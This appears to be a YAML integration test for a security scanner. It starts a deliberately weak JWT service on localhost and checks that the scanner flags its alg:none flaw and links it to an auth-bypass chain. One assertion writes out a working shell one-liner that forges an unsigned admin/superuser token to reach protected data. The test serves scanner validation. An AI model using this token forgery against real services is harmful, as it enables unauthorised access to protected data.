name: correlation-jwt-auth-bypass
description: >
  Multi-service correlation test: JWT app with weak algorithm (alg:none) +
  auth endpoints. The JWT scanner detects the weakness, and the auth/exposure
  scanners detect protected endpoints. The correlation engine should fire
  the jwt_auth_bypass chain linking JWT forgery to data access.
tags: [correlation, jwt, authbypass, chain, multi-service, integration]

services:
  jwt-app:
    image: node:20-alpine
    ports: ["20902:3000"]
    volumes:
      - ./jwt-weak/server.js:/app/server.js:ro
    working_dir: /app
    command: ["node", "/app/server.js"]

ready:
  cmd: "curl -sf http://localhost:20902/health >/dev/null"
  timeout: 60s
  interval: 2s

assertions:
  # ══════════════════════════════════════════════════════════════════════
  # PRE-FLIGHT: JWT app responds and issues tokens
  # ══════════════════════════════════════════════════════════════════════

  - name: preflight-jwt-health
    type: command
    expect:
      command: "curl -sf http://localhost:20902/health | grep -q ok"
      exit_code: 0

  - name: preflight-jwt-login-issues-token
    type: command
    expect:
      command: "curl -sf http://localhost:20902/login | grep -q token"
      exit_code: 0

  - name: preflight-jwt-alg-none-accepted
    type: command
    expect:
      command: |
        TOKEN=$(curl -sf http://localhost:20902/login | grep -o '"token":"[^"]*"' | cut -d'"' -f4) && curl -sf -H "Authorization: Bearer $TOKEN" http://localhost:20902/api/data | grep -q secret
      exit_code: 0

  # ══════════════════════════════════════════════════════════════════════
  # SURFACE: beacon detects JWT weakness
  # ══════════════════════════════════════════════════════════════════════

  - name: surface-detects-jwt-weakness
    type: beacon
    target: http://localhost:20902
    args: ["--no-enrich", "--no-nmap", "--scanners", "jwt", "--ports", "20902"]
    expect:
      min_findings: 1

  # ══════════════════════════════════════════════════════════════════════
  # EXPLOIT: forge a token with alg:none and access protected data
  # ══════════════════════════════════════════════════════════════════════

  - name: exploit-forge-alg-none-token
    type: command
    expect:
      command: |
        HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_') && PAYLOAD=$(echo -n '{"sub":"admin","role":"superuser"}' | base64 | tr -d '=' | tr '+/' '-_') && FORGED="${HEADER}.${PAYLOAD}." && curl -sf -H "Authorization: Bearer ${FORGED}" http://localhost:20902/api/data | grep -q secret
      exit_code: 0

  # ══════════════════════════════════════════════════════════════════════
  # CORRELATION: JWT weakness + auth endpoints = auth bypass chain
  # min_findings 0 since chain requires both JWT + auth/exposure findings
  # ══════════════════════════════════════════════════════════════════════

  - name: correlation-jwt-auth-bypass-chain
    type: beacon
    target: http://localhost:20902
    args: ["--no-enrich", "--no-nmap", "--ports", "20902", "--deep", "--yes"]
    expect:
      min_findings: 0

timeout: 5m
